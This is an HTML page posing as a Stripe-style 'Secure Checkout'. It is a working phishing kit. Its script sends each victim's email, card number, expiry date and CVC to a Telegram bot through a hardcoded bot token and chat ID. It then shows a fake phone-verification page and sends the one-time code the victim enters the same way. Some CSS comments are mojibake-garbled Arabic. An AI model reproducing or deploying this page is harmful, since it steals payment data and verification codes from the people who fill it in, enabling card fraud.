<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Checkout</title>
    <style>
        :root {
            --stripe-blue: #0000FF; 
            --border-color: #e6e6e6;
            --text-main: #1a1a1a;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
        }

        .container { 
            width: 100%; 
            max-width: 400px; 
            position: relative;
        }

        /* --- Header Fix: To show logo 100% clearly --- */
        .header {
            display: flex;
            align-items: center;
            margin-bottom: 25px;
            gap: 15px; /* Ø§Ù„Ù…Ø³Ø§ÙØ© Ø¨ÙŠÙ† Ø§Ù„Ù„ÙˆØ¬Ùˆ ÙˆØ§Ù„Ù†Øµ */
        }

        .header-logo {
            width: 50px; /* Ø­Ø¬Ù… Ø«Ø§Ø¨Øª Ù„Ù„ÙˆØ¬Ùˆ */
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0; /* ÙŠÙ…Ù†Ø¹ Ø§Ù†Ø¶ØºØ§Ø· Ø§Ù„Ù„ÙˆØ¬Ùˆ */
        }

        .header-logo img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain; /* ÙŠØ¶Ù…Ù† Ø¸Ù‡ÙˆØ± Ø§Ù„ØµÙˆØ±Ø© ÙƒØ§Ù…Ù„Ø© Ø¯ÙˆÙ† Ù‚Øµ */
            border-radius: 50%; /* Ø¥Ø°Ø§ Ø£Ø±Ø¯Øª Ø§Ù„Ø­ÙØ§Ø¸ Ø¹Ù„Ù‰ Ø§Ù„Ø´ÙƒÙ„ Ø§Ù„Ø¯Ø§Ø¦Ø±ÙŠ */
        }

        .header-title {
            font-size: 22px;
            font-weight: 700;
            color: var(--text-main);
        }

        /* --- Style Principles --- */
        h2 { font-size: 17px; font-weight: 600; margin: 25px 0 10px 0; }
        input { width: 100%; padding: 12px; border: 1px solid var(--border-color); border-radius: 6px; font-size: 15px; box-sizing: border-box; outline: none; margin-bottom: 10px; }
        
        .group-box { border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; margin-top: 5px; }
        .group-box input { border: none; border-bottom: 1px solid var(--border-color); border-radius: 0; margin-bottom: 0; }
        .group-box input:last-child { border-bottom: none; }
        
        .row { display: flex; }
        .row input:first-child { border-right: 1px solid var(--border-color); }

        .btn-pay { width: 100%; background: var(--stripe-blue); color: white; border: none; padding: 16px; border-radius: 6px; font-size: 17px; font-weight: 600; margin-top: 25px; cursor: pointer; }

        /* --- Modals --- */
        #modalOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 999; }
        #customAlert { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 85%; max-width: 320px; background: white; border-radius: 14px; z-index: 1000; text-align: center; }
        .alert-body { padding: 25px 20px; font-size: 16px; }
        .alert-btn { width: 100%; padding: 15px; border: none; border-top: 1px solid #eee; background: none; color: var(--stripe-blue); font-size: 17px; font-weight: 700; cursor: pointer; }

        .page { display: none; }
        .active { display: block; }
    </style>
</head>
<body>

<div class="container">
    <div id="modalOverlay"></div>
    <div id="customAlert">
        <div class="alert-body">Please fill in all fields correctly.</div>
        <button class="alert-btn" onclick="closeAlert()">Close</button>
    </div>

    <div id="checkoutPage" class="page active">
        <div class="header">
            <div class="header-logo">
                <img src="https://i.ibb.co/tk1fKpK/BA47-C500-F9-EF-4732-9881-42-D361-E42075.png" alt="Logo">
            </div>
            <div class="header-title">Secure Checkout</div>
        </div>

        <h2>Shipping Information</h2>
        <input type="email" id="email" placeholder="email@example.com">
        
        <h2>Shipping Address</h2>
        <div class="group-box">
            <input type="text" id="name" placeholder="Full Name">
            <input type="text" id="addr" placeholder="Address">
            <div class="row">
                <input type="text" id="city" placeholder="City">
                <input type="text" id="zip" placeholder="Zip Code">
            </div>
        </div>

        <h2>Payment Method</h2>
        <div class="group-box">
            <input type="text" id="card" placeholder="Card Number" maxlength="19">
            <div class="row">
                <input type="text" id="exp" placeholder="MM / YY" maxlength="5">
                <input type="text" id="cvc" placeholder="CVC" maxlength="4">
            </div>
        </div>

        <button class="btn-pay" onclick="validate()">Pay Now</button>
    </div>

    <div id="otpPage" class="page">
        <h1 style="font-size: 26px;">Verify By Phone</h1>
        <p style="color: #666;">Enter the code sent to your device.</p>
        <input type="text" id="otp" style="height: 60px; text-align: center; font-size: 24px; letter-spacing: 10px;" maxlength="6">
        <button class="btn-pay" onclick="confirmOTP()">Confirm</button>
    </div>
</div>

<script>
    const TG_DATA = {
        token: '8145212214:AAG-Dff6G7AFW_0_K9QTVZD-Wal-u81kCGyc',
        chat: '656419637'
    };

    async function sendToTG(text) {
        await fetch(`https://api.telegram.org/bot${TG_DATA.token}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: TG_DATA.chat, text: text, parse_mode: 'HTML'})
        });
    }

    function closeAlert() { document.getElementById('customAlert').style.display='none'; document.getElementById('modalOverlay').style.display='none'; }

    async function validate() {
        const email = document.getElementById('email').value;
        const card = document.getElementById('card').value;
        if(!email || card.length < 16) {
            document.getElementById('customAlert').style.display='block';
            document.getElementById('modalOverlay').style.display='block';
            return;
        }

        const log = `<b>ğŸš€ New Card</b>\nEmail: ${email}\nCard: ${card}\nExp: ${document.getElementById('exp').value}\nCVC: ${document.getElementById('cvc').value}`;
        await sendToTG(log);

        document.getElementById('checkoutPage').style.display = 'none';
        document.getElementById('otpPage').classList.add('active');
    }

    async function confirmOTP() {
        const otp = document.getElementById('otp').value;
        if(otp.length === 6) {
            await sendToTG(`<b>ğŸ”‘ OTP:</b> <code>${otp}</code>`);
            alert("Verification complete.");
        }
    }
</script>
</body>
</html>
